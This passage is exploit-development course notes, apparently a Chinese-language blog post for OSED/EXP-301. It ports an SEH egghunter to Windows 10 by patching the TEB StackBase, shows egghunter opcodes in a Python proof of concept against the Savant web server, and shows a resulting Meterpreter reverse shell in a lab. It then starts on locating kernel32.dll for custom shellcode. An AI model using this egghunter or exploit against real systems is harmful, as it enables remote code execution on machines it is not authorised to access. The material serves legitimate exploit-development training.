---
title: "[OSED, EXP-301] Instructional notes - Part 4"
date: 2026-11-17
author: "CHW"
tags:
  - offsec
description: "OSED EXP-301 筆記 Part 4，將 SEH-Based Egghunter 透過修改 TEB StackBase 移植到 Windows 10，接著手寫 x86 Custom Shellcode：以 PEB Method 定位 kernel32.dll、解析 Export Table 並用 Hash 比對找出 API，實作 NULL-Free 與 Position-Independent Shellcode，最後串接 ws2_32.dll 的 WSAStartup、WSASocketA、WSAConnect 與 CreateProcessA 取得 Reverse Shell。"
---

[OSED, EXP-301] Instructional notes - Part 4
===


# Table of Contents
[TOC]

# [Link back to: "[OSED, EXP-301] Instructional notes - Part 1"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-1/)
# [Link back to: "[OSED, EXP-301] Instructional notes - Part 2"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-2/)
# [Link back to: "[OSED, EXP-301] Instructional notes - Part 3"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-3/)

# Overcoming Space Restrictions: Egghunters
## ...
## Improving the Egghunter Portability Using SEH
>[!Caution]
> 接續 [[OSED, EXP-301] Instructional notes - Part 3](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-3/) 內容

### Identifying the SEH-Based Egghunter Issue
![image](https://hackmd.io/_uploads/HkVzwLx0Mg.png)\
原本可以正常運作的 SEH-Based Egghunter，在 Windows 10 上卻無法成功觸發自訂的 `_except_handler`

首先回顧之前 SEH-Based Egghunter 的設計。我們會在 Stack 上建立一個自訂的 `_EXCEPTION_REGISTRATION_RECORD`：
```cpp
typedef struct _EXCEPTION_REGISTRATION_RECORD {
    struct _EXCEPTION_REGISTRATION_RECORD *Next;
    PEXCEPTION_ROUTINE Handler;
} EXCEPTION_REGISTRATION_RECORD;
```
>[!Tip]
>Windows 10 在執行 Exception Handler 之前，會先檢查 Handler 的記憶體位置是否合法\
>由於 Handler 放在 Stack 上，因此不符合 Windows 10 的檢查條件

[環境範例]\
在 IDA 中開啟 ntdll.dll，並執行 PoC，程式會在 WinDbg 中access violation\
ntdll.dll 檔案已在 IDA 中反彙編，在 Windows 10 VM `C:\Installers\egghunter\ntdll.idb`

使用 IDA 與 WinDbg 同時分析 ntdll.dll

根據前面章節已知 當程式發生 Exception 時，Windows 會進入 `ntdll!KiUserExceptionDispatcher` 接著呼叫 `ntdll!RtlDispatchException`\
![image](https://hackmd.io/_uploads/ryqmh8xCMe.png)

(IDA)\
![image](https://hackmd.io/_uploads/rkFNbDxAzl.png)

(Windbg)\
WinDbg 指令確認 RtlDispatchException 是否真的被呼叫
```dbg
0:009> g
(390.113c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=54303057 ebx=00000000 ecx=00000002 edx=77cd1670 esi=01755760 edi=00000000
eip=03e4eaba esp=03e4ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
03e4eaba f3af            repe scas dword ptr es:[edi]

0:002> bp ntdll!RtlDispatchException

0:002> bl
     0 e Disable Clear  77c86a10     0001 (0001)  0:**** ntdll!RtlDispatchException

0:002> g
Breakpoint 0 hit
eax=54303057 ebx=03e4e5c0 ecx=03e4e5dc edx=77cd1670 esi=01755760 edi=00000000
eip=77c86a10 esp=03e4e5ac ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlDispatchException:
77c86a10 8bff            mov     edi,edi

0:002> bd 0
```
當 Access Violation 發生後成功停在 
```asm
ntdll!RtlDispatchException
77c86a10  8bff  mov edi,edi
```
> 確認 Exception Dispatch 流程確實進入 RtlDispatchException

理解 TEB 與 StackBase、StackLimit:\
RtlDispatchException 裡面有呼叫 [RtlpGetStackLimits](https://web.archive.org/web/20190822135445/http://www.codewarrior.cn/ntdoc/win2k/rtl/ia64/RtlpGetStackLimits.htm) 這個函式負責取得目前 Thread 的 Stack 範圍

在 x86 環境中透過 FS Segment 存取 TEB
```dbg
0:006> dt _NT_TIB
ntdll!_NT_TIB
   +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD
   +0x004 StackBase        : Ptr32 Void
   +0x008 StackLimit       : Ptr32 Void
   +0x00c SubSystemTib     : Ptr32 Void
   +0x010 FiberData        : Ptr32 Void
   +0x010 Version          : Uint4B
   +0x014 ArbitraryUserPointer : Ptr32 Void
   +0x018 Self             : Ptr32 _NT_TIB
```
> ![image](https://hackmd.io/_uploads/rysT4PgRfg.png)


>[!Note]
>StackBase 和 StackLimit 的關係\
>在一般 Windows x86 Thread 中，Stack 通常由高位址往低位址成長\
>![image](https://hackmd.io/_uploads/B1heSveCGe.png)
>>  StackLimit < StackAddress < StackBase

(IDA)\
![image](https://hackmd.io/_uploads/ryn8VDxRGe.png)

WinDbg 確認 StackBase 和 StackLimit，在 RtlDispatchException 設定 Breakpoint
```dbg
0:002> bp ntdll + 46AD1

0:002> g
Breakpoint 1 hit
eax=00000000 ebx=03e4e5dc ecx=03e4e4fc edx=77cd1670 esi=03e4ea2c edi=00000000
eip=77c86ad1 esp=03e4e518 ebp=03e4e5a8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlDispatchException+0xc1:
77c86ad1 8b7c2420        mov     edi,dword ptr [esp+20h] ss:0023:03e4e538=03e4c000

0:002> t
eax=00000000 ebx=03e4e5dc ecx=03e4e4fc edx=77cd1670 esi=03e4ea2c edi=03e4c000
eip=77c86ad5 esp=03e4e518 ebp=03e4e5a8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlDispatchException+0xc5:
77c86ad5 8b5c2428        mov     ebx,dword ptr [esp+28h] ss:0023:03e4e540=03e50000

0:002> t
eax=00000000 ebx=03e50000 ecx=03e4e4fc edx=77cd1670 esi=03e4ea2c edi=03e4c000
eip=77c86ad9 esp=03e4e518 ebp=03e4e5a8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlDispatchException+0xc9:
77c86ad9 7553            jne     ntdll!RtlDispatchException+0x11e (77c86b2e) [br=0]

0:002> !teb
TEB at 003e1000
    ExceptionList:        03e4ea2c
    StackBase:            03e50000
    StackLimit:           03e4c000
    SubSystemTib:         00000000
...

0:002> r @edi; r @ebx
edi=03e4c000
ebx=03e50000
```
> ![image](https://hackmd.io/_uploads/S1GrLweAfx.png)

在 IDA 中可發現 RtlDispatchException 的檢查條件會執行多個比較，通過後才有機會呼叫 RtlIsValidHandle\
![image](https://hackmd.io/_uploads/B1n9Pwl0Me.png)

在第一個比較指令設定 Breakpoint: `ntdll + 46B45`
```dbg
0:002> bp ntdll + 46B45

0:002> bl
     0 d Enable Clear  77c86a10     0001 (0001)  0:**** ntdll!RtlDispatchException
     1 e Disable Clear  77c86ad1     0001 (0001)  0:**** ntdll!RtlDispatchException+0xc1
     2 e Disable Clear  77c86b45     0001 (0001)  0:**** ntdll!RtlDispatchException+0x135

0:002> g
Breakpoint 2 hit
eax=00000000 ebx=03e50000 ecx=03e4ea2c edx=03e4e5dc esi=03e4e5c0 edi=03e4c000
eip=77c86b45 esp=03e4e518 ebp=03e4e5a8 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
ntdll!RtlDispatchException+0x135:
77c86b45 3bcf            cmp     ecx,edi
```
> 成功停在 `cmp ecx, edi`\
> 目前 Register：
> - ECX = 03e4ea2c
> - EDI = 03e4c000
> - EBX = 03e50000


- Check 1：Exception Registration Record 必須高於 StackLimit
- Check 2：Exception Record + 0x08 必須低於 StackBase
- Check 3：Exception Record 必須符合 4-byte Alignment
- Check 4：Exception Handler 必須高於 StackBase
```dbg
0:002> t
eax=03e4ea34 ebx=03e50000 ecx=03e4ea2c edx=03e4e5dc esi=03e4e5c0 edi=03e4c000
eip=77c86b61 esp=03e4e518 ebp=03e4e5a8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlDispatchException+0x151:
77c86b61 8b4904          mov     ecx,dword ptr [ecx+4] ds:0023:03e4ea30=03e4eacd

0:002> dt _EXCEPTION_REGISTRATION_RECORD @ecx
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x03e4eacd     _EXCEPTION_DISPOSITION  +3e4eacd

0:002> t
eax=03e4ea34 ebx=03e50000 ecx=03e4eacd edx=03e4e5dc esi=03e4e5c0 edi=03e4c000
eip=77c86b64 esp=03e4e518 ebp=03e4e5a8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlDispatchException+0x154:
77c86b64 3bcb            cmp     ecx,ebx

0:002> !teb
TEB at 003e1000
    ExceptionList:        03e4ea2c
    StackBase:            03e50000
    StackLimit:           03e4c000
    SubSystemTib:         00000000
...

0:002> r @ecx; r @ebx
ecx=03e4eacd
ebx=03e50000
```
> 取得 _EXCEPTION_REGISTRATION_RECORD 的 Handler 欄位\
> `cmp ecx, ebx` 確保 Exception Handler 不位於 Stack 裡面
> > Handler   = 03e4eacd\
> > StackBase = 03e50000\
> > "03e4eacd < 03e50000"\
> > 👉🏻 原本 SEH-Based Egghunter 在 Windows 10 上失敗的真正原因


![image](https://hackmd.io/_uploads/SJaE3wlCMx.png)

PS 若 SafeSEH 有啟用，還需要通過 Handler 的合法性驗證
```dbg
0:002> !nmod
00400000 00452000 Savant               /SafeSEH OFF                C:\Savant\Savant.exe
5a710000 5a79e000 COMCTL32             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.16299.15_none_2c294b7f17b4b002\COMCTL32.dll
66da0000 66fb1000 comctl32_66da0000    /SafeSEH ON  /GS *ASLR *DEP C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.16299.15_none_1440321736920223\comctl32.DLL
...
```
> 查看各個 Module 的保護機制\
> Savant /SafeSEH OFF: 代表 Savant.exe 沒有啟用 SafeSEH 

既然 Handler < StackBase 那就直接修改 TEB 裡面的 StackBase\
Update egghunter code (讓 StackBase 變成：
`StackBase = Handler - 0x04`)
```asm
...
"	build_exception_record: 				 "
		# pop the address of the exception_handler 
		# into ecx
"		pop ecx 							;" 
		# mov signature into eax
"		mov eax, 0x74303077 				;" 
		# push Handler of the 
		# _EXCEPTION_REGISTRATION_RECORD structure
"		push ecx 							;" 
		# push Next of the 
		# _EXCEPTION_REGISTRATION_RECORD structure
"		push 0xffffffff 					;" 
		# null out ebx
"		xor ebx, ebx 						;" 
		# overwrite ExceptionList in the TEB with a pointer 
		# to our new _EXCEPTION_REGISTRATION_RECORD structure
"		mov dword ptr fs:[ebx], esp 		;" 
		# subtract 0x04 from the pointer 
		# to exception_handler
"		sub ecx, 0x04 						;" 
		# add 0x04 to ebx
"		add ebx, 0x04 						;" 
		# overwrite the StackBase in the TEB
"		mov dword ptr fs:[ebx], ecx 		;" 
...
```

新的 StackBase 必須同時符合 "Check 2：Exception Record + 0x08 必須低於 StackBase" 
```
Record+0x08 < NewStackBase < Handler
```

### Porting the SEH Egghunter to Windows 10
1. 修改 Egghunter 的 Assembly
完整程式碼：
```asm
pop ecx
mov eax, 0x74303077

push ecx
push 0xffffffff

xor ebx, ebx

mov dword ptr fs:[ebx], esp

sub ecx, 0x04
add ebx, 0x04

mov dword ptr fs:[ebx], ecx
```
將 TEB 的 StackBase 修改為 Exception Handler - 4\
![image](https://hackmd.io/_uploads/SyOoJdgAGe.png)\
(修改 Windows 用來判斷 Stack 範圍的 StackBase)

將新增的 Assembly 轉換成 Opcode 更新 Python PoC
```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 

  egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"      # NOP sled
               b"\xeb\x2a\x59\xb8\x77\x30\x30\x74"
               b"\x51\x6a\xff\x31\xdb\x64\x89\x23"
               b"\x83\xe9\x04\x83\xc3\x04\x64\x89"
               b"\x0b\x6a\x02\x59\x89\xdf\xf3\xaf"
               b"\x75\x07\xff\xe7\x66\x81\xcb\xff"
               b"\x0f\x43\xeb\xed\xe8\xd1\xff\xff"
               b"\xff\x6a\x0c\x59\x8b\x04\x0c\xb1"
               b"\xb8\x83\x04\x08\x06\x58\x83\xc4"
               b"\x10\x50\x31\xc0\xc3")

  inputBuffer = b"\x41" * (size - len(egghunter))
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
...
```
(Windbg)
```dbg
0:003> t
eax=74303077 ebx=00000004 ecx=03e5ead2 edx=77cd1670 esi=018d5760 edi=0041703c
eip=03e5eabe esp=03e5ea2c ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
03e5eabe 6a02            push    2

0:003> !teb
TEB at 00234000
    ExceptionList:        03e5ea2c
    StackBase:            03e5ead2
    StackLimit:           03e5c000
    SubSystemTib:         00000000
...

0:003> dt _EXCEPTION_REGISTRATION_RECORD 03e5ea2c
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x03e5ead6     _EXCEPTION_DISPOSITION  +3e5ead6
```
> - `Record`       = 03e5ea2c
> - `Record + 8`   = 03e5ea34
> - `StackLimit`   = 03e5c000
> - `StackBase`   = 03e5ead2
> - `Handler`      = 03e5ead6
>
>![image](https://hackmd.io/_uploads/ByxOgugRGl.png)


追蹤 RtlDispatchException 的所有比較指令，對自訂 Handler 設定 Breakpoint:
```dbg
0:003> g
(ce0.12f4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=74303077 ebx=00000004 ecx=00000002 edx=77cd1670 esi=018d5760 edi=00000004
eip=03e5eac3 esp=03e5ea2c ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
03e5eac3 f3af            repe scas dword ptr es:[edi]

0:003> !exchain
03e5ea2c: 03e5ead6
Invalid exception stack at ffffffff

0:003> bp 03e5ead6

0:003> g
Breakpoint 1 hit
eax=00000000 ebx=00000000 ecx=03e5ead6 edx=77ce3b20 esi=00000000 edi=00000000
eip=03e5ead6 esp=03e5e4b8 ebp=03e5e4d8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
03e5ead6 6a0c            push    0Ch

0:003> u @eip
03e5ead6 6a0c            push    0Ch
03e5ead8 59              pop     ecx
03e5ead9 8b040c          mov     eax,dword ptr [esp+ecx]
03e5eadc b1b8            mov     cl,0B8h
03e5eade 83040806        add     dword ptr [eax+ecx],6
03e5eae2 58              pop     eax
03e5eae3 83c410          add     esp,10h
03e5eae6 50              push    eax
```
👉🏻 Windows 已經成功進入我們自己放在 Stack 上的 `_except_handler`

查看為什麼 Exception Handler 能讓 Egghunter 繼續執行
```dbg
0:003> t
eax=00000000 ebx=00000000 ecx=0000000c edx=77ce3b20 esi=00000000 edi=00000000
eip=03e5ead9 esp=03e5e4b8 ebp=03e5e4d8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
03e5ead9 8b040c          mov     eax,dword ptr [esp+ecx] ss:0023:03e5e4c4=03e5e5dc

0:003> t
...

0:003> dt _CONTEXT @eax
ntdll!_CONTEXT
   +0x000 ContextFlags     : 0x1007f
...
   +0x0a0 Esi              : 0x18d5760
   +0x0a4 Ebx              : 4
   +0x0a8 Edx              : 0x77cd1670
   +0x0ac Ecx              : 2
   +0x0b0 Eax              : 0x74303077
   +0x0b4 Ebp              : 0x41414141
   +0x0b8 Eip              : 0x3e5eac3
...

0:003> u 0x3e5eac3
03e5eac3 f3af            repe scas dword ptr es:[edi]
03e5eac5 7507            jne     03e5eace
03e5eac7 ffe7            jmp     edi
03e5eac9 6681cbff0f      or      bx,0FFFh
03e5eace 43              inc     ebx
03e5eacf ebed            jmp     03e5eabe
03e5ead1 e8d1ffffff      call    03e5eaa7
03e5ead6 6a0c            push    0Ch

0:003> ? 03e5eac9 - 03e5eac3 
Evaluate expression: 6 = 00000006
```
>- `mov eax, dword ptr [esp+ecx]` 等同 `mov eax, [esp+0x0C]`\
取得的是第三個參數，也就是指向 CONTEXT 結構的 Pointer
>- `CONTEXT + 0xB8 = EIP`
>透過修改 CONTEXT 裡面的 EIP，控制 Exception 處理完成後程式要從哪個位置繼續執行
>- `03e5eac9 - 03e5eac3 = 6` 後移 6 bytes

把 EIP 改到 Egghunter 的下一個適當位置
```asm
mov cl, 0B8h
add dword ptr [eax+ecx], 6
```
> CONTEXT+0xB8 正好是 EIP

(Windbg)
```dbg
0:003> r
eax=03e5e5dc ebx=00000000 ecx=000000b8 edx=77ce3b20 esi=00000000 edi=00000000
eip=03e5eade esp=03e5e4b8 ebp=03e5e4d8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
03e5eade 83040806        add     dword ptr [eax+ecx],6 ds:0023:03e5e694=03e5eac3

0:003> t
...

0:003> dt _CONTEXT @eax
ntdll!_CONTEXT
   +0x000 ContextFlags     : 0x1007f
...
   +0x09c Edi              : 4
   +0x0a0 Esi              : 0x18d5760
   +0x0a4 Ebx              : 4
   +0x0a8 Edx              : 0x77cd1670
   +0x0ac Ecx              : 2
   +0x0b0 Eax              : 0x74303077
   +0x0b4 Ebp              : 0x41414141
   +0x0b8 Eip              : 0x3e5eac9
...

0:003> u 0x3e5eac9 Le
03e5eac9 6681cbff0f      or      bx,0FFFh
03e5eace 43              inc     ebx
03e5eacf ebed            jmp     03e5eabe
03e5ead1 e8d1ffffff      call    03e5eaa7
03e5ead6 6a0c            push    0Ch
03e5ead8 59              pop     ecx
03e5ead9 8b040c          mov     eax,dword ptr [esp+ecx]
03e5eadc b1b8            mov     cl,0B8h
03e5eade 83040806        add     dword ptr [eax+ecx],6
03e5eae2 58              pop     eax
03e5eae3 83c410          add     esp,10h
03e5eae6 50              push    eax
03e5eae7 31c0            xor     eax,eax
03e5eae9 c3              ret
```
> 告訴 Windows Exception 已經處理完畢，從修改後的 CONTEXT.EIP 繼續執行

>[!Tip]
>Egghunter 的工作方式是：
>1. 搜尋記憶體
>2. 遇到沒有 Mapping 的 Memory Page
>3. 或遇到沒有存取權限的 Memory Page
>4. 觸發 Access Violation
>5. 由 SEH Handler 處理
>6. 修改 CONTEXT，繼續搜尋下一個 Page
>所以在搜尋過程中，發生 Access Violation 是預期行為
>
>但是 WinDbg 預設會在 First Chance Exception 發生時中斷執行，讓我們一直停在 Debugger 裡面

利用 `sxd av`, `sxd gp` 設定 Second Chance Break:\
![image](https://hackmd.io/_uploads/HkIVNdgRfg.png)

`bc *` 清除所有 Breakpoints
```dbg
0:003> sxd av

0:003> sxd gp

0:003> bc *

0:003> g
```

成功取得 Reverse Meterpreter:
```bash
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.119.120:443 
[*] Sending stage (180291 bytes) to 192.168.120.10
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.10:49675) 

meterpreter > shell
Process 1796 created.
Channel 1 created.
Microsoft Windows [Version 10.0.16299.15]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Savant> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.120.10
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.120.254

C:\Savant>
```
Windows 10 SEH-Based Egghunter 運作正常。證明對 StackBase 的修改，以及 Exception Handler 裡面的 CONTEXT.EIP 修改都成功運作

# Creating Custom Shellcode
進入 OSED 的 Shellcode 開發階段 🫩🫩🫩\
([Web vs Binary](https://www.youtube.com/shorts/Zp0TD1qcKAg))\
![image](https://hackmd.io/_uploads/Byf_H_gRzg.png)\

前幾章皆使用 Metasploit Framework 產生 Payload，再將 Payload 整合到 Exploit 中。但這一章開始不再依賴 Metasploit，而是直接使用 Assembly 撰寫自己的 Shellcode，最後將它轉換成 Opcode，整合到 Exploit 

[Shellcode](http://en.wikipedia.org/wiki/Shellcode) 是一組 CPU Instructions，最初 Shellcode 的名稱來自 Exploit 中用來取得 Root Shell 的程式碼。但現在 Shellcode 的用途遠遠不只取得 Shell\
![image](https://hackmd.io/_uploads/S1asX5lRGe.png)
> 通常先使用 Assembly 撰寫，再轉換成 Hexadecimal Opcode


## Calling Conventions on x86
須先理解 Windows x86 的 [Calling Convention](https://en.wikipedia.org/wiki/Calling_convention)，Shellcode 經常需要呼叫 Windows API，Ex `LoadLibraryA()`, `GetModuleHandleA()`, `GetProcAddress()`

>[!Note]
>Calling Convention 定義了函式呼叫時的規則\
>四個主要項目：
>1. Arguments 如何傳遞給 Function。
>2. 哪些 Registers 必須由被呼叫的 Function 保留。
>3. 呼叫 Function 前，Stack Frame 如何準備。
>4. Function 執行結束後，Stack Frame 如何還原。
>
>簡單來說 Calling Convention 就是 Caller 和 Callee 之間約定好的溝通規則

Win32 API functions 使用 [__stdcall](https://msdn.microsoft.com/en-us/library/zxk0tw93.aspx) calling convention, 而 C runtime functions 使用 [__cdecl](https://docs.microsoft.com/en-us/cpp/cpp/cdecl?view=msvc-160) calling convention\
![image](https://hackmd.io/_uploads/B1-CxixCzg.png)

- __cdecl: Callee 清理 Stack
![image](https://hackmd.io/_uploads/HkMOWjxCGx.png)
- __cdecl: Caller 清理 Stack
![image](https://hackmd.io/_uploads/ryyY-se0Gg.png)

在 32-bit Windows Calling Convention 中，Registers 可以分成兩類：\
![image](https://hackmd.io/_uploads/r1HPfogCfe.png)

- Volatile Registers
Volatile 的意思是：不保證 Function 執行後，Register 仍然維持原本的值\
(Clobbered是 Function 呼叫過程中，Register 的原始值被覆蓋，並且沒有恢復)

- Non-volatile Registers
Non-volatile Registers 必須由 Callee 保留，即使 Function 執行期間需要使用 EBX，也必須在返回前恢復原本的值\
常見的 Function Prologue：
```asm
push ebp
mov ebp, esp
push ebx
push esi
push edi
```
Function Epilogue：
```asm
pop edi
pop esi
pop ebx
mov esp, ebp
pop ebp
ret
```
## The System Call Problem

>[!Note]
>System Call:\
>System Call（系統呼叫）是 User Mode 與 Kernel Mode 之間的介面。一般應用程式執行時，主要位於 User Mode\
>🥚 有些操作需要作業系統核心協助，例如：
>- 檔案 I/O
>- Thread Synchronization
>- Socket Management
>- Memory Management
>- Process Management
>
>[syscalls](http://en.wikipedia.org/wiki/System_call) 提供了一個受控的介面，讓應用程式可以使用 Kernel 功能，同時避免直接破壞作業系統


>[!Note]
>Windows [Native API](https://social.technet.microsoft.com/wiki/contents/articles/11831.the-windows-native-api.aspx): ([mostly-undocumented application programming interface](http://en.wikipedia.org/wiki/Native_API))\
>Windows Native API 可以理解為 Windows User Mode 與 Kernel 之間的重要 API 介面。主要由 `ntdll.dll` 提供給 User Mode 應用程式
>Ex. NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, NtOpenProcess\
>這些都是 Windows Native API 中常見的函式名稱。一般 Win32 API 與 Native API 的關係可以先這樣理解：
>```
>Application
>     |
>     v
>Win32 API
>     |
>     v
>Native API (ntdll.dll)
>     |
>     v
>System Call
>     |
>     v
>Windows Kernel
>```

不直接使用 Windows System Call？!\
Reason:\
1. System Call Number 會隨 Windows 版本改變
Kernel Function 通常透過 System Call Number 識別，但 Windows 的 System Call Number 可能隨著不同版本更新而改變
2. Windows System Call Interface 功能有限
Windows 不會透過 System Call Interface 直接提供 Socket API\
(若要開發 Reverse Shell，需要使用 Socket 功能。但 Windows System Call Interface 並沒有直接提供完整的 Socket API，不能只依賴 System Call 完成整個 Reverse Shell)

UNIX 與 Windows:\
![image](https://hackmd.io/_uploads/HyP0aOZAGx.png)

動態取得 Windows API Function Address:
API | 功能 | 範例 |
:------|:--------|:--------|
[LoadLibraryA](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) |    載入 DLL    |  `LoadLibraryA("ws2_32.dll");` |
[GetModuleHandleA](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea) |    取得已載入 DLL 的 Base Address  | `GetModuleHandleA("kernel32.dll");` |
[GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) |    取得 DLL Export Function 的 Address | `GetProcAddress( hKernel32,"LoadLibraryA" );`  |

![image](https://hackmd.io/_uploads/BJT_xFWCMe.png)

GetModuleHandleA、LoadLibraryA 和 GetProcAddress 本身也需要 "Function Address" 才能呼叫。\
Shellcode 取得這些 Function Address？

## Finding kernel32.dll
![image](https://hackmd.io/_uploads/ryFpfFZAzl.png)
三種尋找 kernel32.dll 的方法：
1. PEB Method
2. SEH（[Structured Exception Handler](https://www.hick.org/code/skape/papers/win32-shellcode.pdf)）
3. [Top Stack Method](https://www.offsec.com/awe/AWEPAPERS/winasm-1.0.1.pdf)

### PEB Method
理解 TEB、PEB 的關係: Windows 每個 Process 都有 PEB（Process Environment Block），而每個 Thread 都有 TEB（[Thread Environment Block](https://en.wikipedia.org/wiki/Win32_Thread_Information_Block)）
結構 | 全名 | 主要用途 |
:------|:--------|:--------|
TEB	| Thread Environment Block | 儲存目前 Thread 的相關資訊
PEB	| Process Environment Block | 儲存目前 Process 的相關資訊
PEB_LDR_DATA | Process Loader Data | 管理 Process 已載入的 Modules
LDR_DATA_TABLE_ENTRY | Loader Data Table Entry | 描述單一已載入的 Module

在 32-bit Windows 中，透過以下路徑取得 PEB：
![image](https://hackmd.io/_uploads/r1BWVKb0ze.png)
1. 從 FS Register 找到 TEB
利用 windbg 查詢 Windows TEB 結構的當前 Thread TEB address
```dbg
0:002> dt nt!_TEB @$teb
ntdll!_TEB
   +0x000 NtTib            : _NT_TIB
   +0x01c EnvironmentPointer : (null) 
   +0x020 ClientId         : _CLIENT_ID
   +0x028 ActiveRpcHandle  : (null) 
   +0x02c ThreadLocalStoragePointer : (null) 
   +0x030 ProcessEnvironmentBlock : 0x7f60b000 _PEB
   +0x034 LastErrorValue   : 0
   +0x038 CountOfOwnedCriticalSections : 0
...
```
> `+0x030 ProcessEnvironmentBlock : 0x7f60b000 _PEB`\
> 代表 TEB 的 Offset 0x30、存放 PEB Pointer、實際位址為 0x7f60b000

`mov esi, fs:[0x30]` 可以取得 PEB 的位址

2. 從 PEB 找到 PEB_LDR_DATA

```dbg
0:002> dt nt!_PEB 0x7f60b000
ntdll!_PEB
   +0x000 InheritedAddressSpace : 0 ''
   +0x001 ReadImageFileExecOptions : 0 ''
   +0x002 BeingDebugged    : 0x1 ''
   +0x003 BitField         : 0x4 ''
   +0x003 ImageUsesLargePages : 0y0
   +0x003 IsProtectedProcess : 0y0
   +0x003 IsImageDynamicallyRelocated : 0y1
   +0x003 SkipPatchingUser32Forwarders : 0y0
   +0x003 IsPackagedProcess : 0y0
   +0x003 IsAppContainer   : 0y0
   +0x003 IsProtectedProcessLight : 0y0
   +0x003 SpareBits        : 0y0
   +0x004 Mutant           : 0xffffffff Void
   +0x008 ImageBaseAddress : 0x00230000 Void
   +0x00c Ldr              : 0x776c9aa0 _PEB_LDR_DATA
...
```
> - `0x08	ImageBaseAddress`: 目前 Process 主執行檔的 Base Address
> - `0x0C	Ldr`: 指向 PEB_LDR_DATA

需要找的是 Ldr `mov esi, [esi+0x0C]`\
假設原本 ESI = 0x7f60b000，執行後：
```asm
ESI = [0x7f60b00c]
ESI = 0x776c9aa0
```
就取得 PEB_LDR_DATA 的位址

3. PEB_LDR_DATA 的三個 Linked Lists
```dbg
0:002> dt _PEB_LDR_DATA 0x776c9aa0
ntdll!_PEB_LDR_DATA
   +0x000 Length           : 0x30
   +0x004 Initialized      : 0x1 ''
   +0x008 SsHandle         : (null) 
   +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x4011728 - 0x40180d0 ]
   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x4011730 - 0x40180d8 ]
   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x4011658 - 0x40180e0 ]
   +0x024 EntryInProgress  : (null) 
   +0x028 ShutdownInProgress : 0 ''
   +0x02c ShutdownThreadId : (null)
```
> - `+0x00c InLoadOrderModuleList`
> - `+0x014 InMemoryOrderModuleList`
> - `+0x01c InInitializationOrderModuleList`
>
>![image](https://hackmd.io/_uploads/By4VtKb0fe.png)

三個 List 都是用來遍歷已載入的 Modules，但排序依據不同\
後續 Shellcode 會透過這個 `InInitializationOrderModuleList` 遍歷 Modules，尋找 kernel32.dll

4. LIST_ENTRY 的結構
```dbg
0:002> dt _LIST_ENTRY (0x776c9aa0 + 0x1c)
ntdll!_LIST_ENTRY
 [ 0x4011658 - 0x40180e0 ]
   +0x000 Flink            : 0x04011658 _LIST_ENTRY [ 0x4011d88 - 0x776c9abc ]
